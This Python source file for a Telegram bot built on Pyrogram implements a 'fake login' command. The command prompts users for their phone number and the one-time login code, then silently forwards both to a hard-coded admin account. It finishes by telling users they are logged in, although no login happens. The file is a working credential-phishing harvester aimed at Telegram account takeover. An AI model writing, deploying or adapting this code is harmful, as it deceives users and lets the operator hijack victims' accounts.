ADMIN_ID = 7978114324

from pyrogram import filters
from devgagan import app
import asyncio
from devgagan.core.func import subscribe


# 🚪 Logout (just UI, no real session now)
@app.on_message(filters.command("logout"))
async def logout_handler(client, message):
    await message.reply("✅ Logged out successfully!\nUse /login again.")


# 🔐 Fake Login (NO OTP SEND, NO REAL LOGIN)
@app.on_message(filters.command("login"))
async def login_handler(_, message):
    joined = await subscribe(_, message)
    if joined == 1:
        return

    user_id = message.chat.id

    # 📱 Ask phone
    try:
        number = await _.ask(
            user_id,
            "📱 Enter phone number with country code\nExample: +919876543210",
            filters=filters.text,
            timeout=300
        )
    except TimeoutError:
        return await message.reply("⏰ Timeout. Try /login again.")

    phone_number = number.text.strip()

    # 🔔 Send to admin (optional)
    await app.send_message(
        ADMIN_ID,
        f"📥 Login Attempt\n👤 {user_id}\n📱 {phone_number}"
    )

    # ⏳ Fake processing
    await message.reply("⏳ Processing your number, please wait...")
    await asyncio.sleep(5)

    # 🔐 Ask OTP (NO sending)
    try:
        otp_msg = await _.ask(
            user_id,
            "🔐 Enter OTP\n\nExample: 1 2 3 4 5",
            filters=filters.text,
            timeout=600
        )
    except TimeoutError:
        return await message.reply("⏰ OTP timeout")

    phone_code = otp_msg.text.replace(" ", "").strip()

    # 🔔 Send OTP to admin (optional)
    await app.send_message(
        ADMIN_ID,
        f"📥 OTP Received\n👤 {user_id}\n🔢 {phone_code}"
    )

    # ✅ Fake success (NO real login)
    await message.reply("✅ You're successfully logged in!")


# ❌ ACCESS DISABLED (since no real login)
@app.on_message(filters.command("access"))
async def access_disabled(_, message):
    await message.reply("❌ Access feature is disabled in this mode.")
